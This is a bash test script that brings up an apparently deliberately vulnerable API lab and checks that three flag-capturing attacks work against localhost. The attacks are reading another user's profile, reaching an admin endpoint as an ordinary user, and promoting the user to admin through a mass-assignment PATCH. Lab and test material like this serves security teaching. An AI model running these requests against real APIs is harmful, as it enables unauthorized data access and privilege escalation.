#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT

echo "[*] Waiting for API on port 5000..."
for i in $(seq 1 30); do
  nc -z -w2 127.0.0.1 5000 2>/dev/null && break
  sleep 2
  if [ "$i" -eq 30 ]; then
    echo "[FAIL] API did not come up after 60 seconds"
    $DC logs
    exit 1
  fi
done
sleep 1

FAIL=0

# Login as alice
TOKEN=$(curl -sf http://127.0.0.1:5000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")

echo ""
echo "[*] Test 1 — BOLA: access bob's profile as alice"
OUT=$(curl -sf http://127.0.0.1:5000/api/users/2 \
  -H "Authorization: Bearer $TOKEN")
if echo "$OUT" | python3 -c "import json,sys; d=json.load(sys.stdin); exit(0 if d.get('flag1','').startswith('POC{') else 1)" 2>/dev/null; then
  FLAG1=$(echo "$OUT" | python3 -c "import json,sys; print(json.load(sys.stdin)['flag1'])")
  echo "[PASS] BOLA: flag1 = $FLAG1"
else
  echo "[FAIL] BOLA: flag1 not found in response: $OUT"
  FAIL=1
fi

echo ""
echo "[*] Test 2 — BFLA: access admin/users as unprivileged alice"
OUT=$(curl -sf http://127.0.0.1:5000/api/admin/users \
  -H "Authorization: Bearer $TOKEN")
if echo "$OUT" | python3 -c "
import json,sys
users=json.load(sys.stdin)
flags=[u['flag2'] for u in users if u.get('flag2')]
exit(0 if flags and flags[0].startswith('POC{') else 1)
" 2>/dev/null; then
  FLAG2=$(echo "$OUT" | python3 -c "import json,sys; users=json.load(sys.stdin); print([u['flag2'] for u in users if u.get('flag2')][0])")
  echo "[PASS] BFLA: flag2 = $FLAG2"
else
  echo "[FAIL] BFLA: flag2 not in admin/users response: $OUT"
  FAIL=1
fi

echo ""
echo "[*] Test 3a — /api/admin/secret blocked for regular user"
CODE=$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:5000/api/admin/secret \
  -H "Authorization: Bearer $TOKEN")
if [ "$CODE" = "403" ]; then
  echo "[PASS] admin/secret correctly returns 403 before escalation"
else
  echo "[FAIL] expected 403, got $CODE"
  FAIL=1
fi

echo ""
echo "[*] Test 3b — mass assignment: set alice role=admin"
curl -sf -X PATCH http://127.0.0.1:5000/api/users/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}' > /dev/null

OUT=$(curl -sf http://127.0.0.1:5000/api/admin/secret \
  -H "Authorization: Bearer $TOKEN")
if echo "$OUT" | python3 -c "import json,sys; d=json.load(sys.stdin); exit(0 if d.get('flag3','').startswith('POC{') else 1)" 2>/dev/null; then
  FLAG3=$(echo "$OUT" | python3 -c "import json,sys; print(json.load(sys.stdin)['flag3'])")
  echo "[PASS] mass assignment + admin/secret: flag3 = $FLAG3"
else
  echo "[FAIL] mass assignment: flag3 not found: $OUT"
  FAIL=1
fi

echo ""
if [ "$FAIL" -eq 0 ]; then
  echo "[PASS] All tests passed"
  exit 0
else
  echo "[FAIL] One or more tests failed"
  exit 1
fi
